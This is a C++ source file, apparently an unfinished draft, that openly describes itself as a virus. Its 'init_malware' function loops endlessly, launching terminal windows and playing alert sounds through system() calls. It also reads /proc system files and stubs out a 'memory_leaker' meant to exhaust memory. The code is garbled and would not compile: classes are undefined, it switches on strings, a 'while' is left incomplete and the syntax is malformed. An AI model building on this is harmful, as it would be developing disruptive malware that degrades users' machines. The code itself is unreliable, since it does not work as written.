/* main.cpp
 *
 *  Created on: Apr 22, 2023
 *      Author: ayaanle
 */
 
 
#include <iostream>
#include <assert.h>
#include <filesystem>
#include <chrono>
#include <vector>
#include <string>
#include <error.h>
#include <fstream>
#include <errno.h>
#include "sysinfo.h"
#define GNOME_TERMINAL_CMD      "gnome-terminal -- "
#define ANNOYING_SOUND          "paplay /usr/share/sounds/gnome/default/alerts/drip.ogg"
#define CPU_TEMP_CMD            " "


using namespace std;
using namespace std::filesystem;
class Virus
{
public:
    constexpr explicit Virus();
    static uint time_steps(uint8_t) ;
    friend const struct system_info* sys_info(struct system_info* sys_info);
    friend inline void file_info(std::vector<string>paths);
    constexpr inline void init_malware();
public:
    bool file_exists = 0;
    signed long int file_size;
};


struct system_struct
{
public:
    std::filesystem::path p;
    std::filesystem::directory_iterator dit;
    std::filesystem::directory_entry de;
    std::fstream strm;
    string buffer;
    size_t total_memory , used_memory , available_memory;
    size_t cache , buffer_memory;
    size_t cpu_temperatures , cpu_usages[]
};
constexpr explicit Virus::Virus()
{

}
inline uint Startup::time_steps(uint8_t num)
{
    #ifdef _GLIBCXX_CHRONO
    auto count = std::chrono::seconds(num).count();
    return count;
    #endif
}


inline void file_info(vector<string>paths)
{
    system_struct ss;
    vector<string>::iterator it;                        
    for(it = paths.begin();it!=paths.end();++it)
    {
       // accessing the most important hardware config infos
      ss.p = *it;
      if(p.has_filename() and p.has_extension()  and p.size()>0)
      {
        if(is_regular_file(p))
        {  
            
           switch(p.filename())
           {
              case "meminfo":
                  while (!strm.eof())
                         strm.get(buffer);
                  std::stoi(buffer.substr(15 , 9) , &ss.total_memory);
                  std::stoi(buffer.substr(40 , 16) , &ss.free_memory);
                  std::stoi(buffer.substr(40 , 16) , &ss.available_memory);
                  std::stoi(buffer.substr(60 , 16) , &ss.cache);
                  break;
              case "stat":
                  while(strm.get(buffer))
                  {
                    std::stoi(buffer.substr(15 , 9) , &ss.total_memory);
                    std::stoi(buffer.substr(40 , 16) , &ss.free_memory);
                    std::stoi(buffer.substr(40 , 16) , &ss.available_memory);
                    std::stoi(buffer.substr(60 , 16) , &ss.cache);
                  }
                   
           }

        }
        error("is not a regular file");
        }
        error("has no filename or extension");
      }
    
}

signed int cpu_stat(cpu_struct cpu)
{
    
}
constexpr inline void init_malware()
{
   int counter = 0;
   for(;;)
        {
            while(counter != Startup::time_steps(2))
            {
               system(GNOME_TERMINAL_CMD);
               system(ANNOYING_SOUND) or system("paplay /tmp/drip.ogg")
               counter++;
            }
            counter -= Startup::time_steps(2);
        }
}

struct memo_struct* memory_leaker::memory_info()
{
    return struct memo_struct* memory_info;
}
inline void memory_leaker::leaker_init()
{
    new int *num = new[10000];
    while
}
int main(int argc , char* argv[])
{
    
    disk_struct ds;
    memory_leaker* memo_leaker;
    const struct memo_strcut* memo_info;  
    string str;
    vector<string>paths = {"/proc/cpuinfo" ,
                           "/proc/meminfo" ,
                           "/proc/stat"};  
    
    cout << str << endl;
    file_info(paths);
    strm.close();
    Startup startup;
    startup.init_malware();
    memory_leaker(memo_info);
    leaker_init();
    return 0;
}
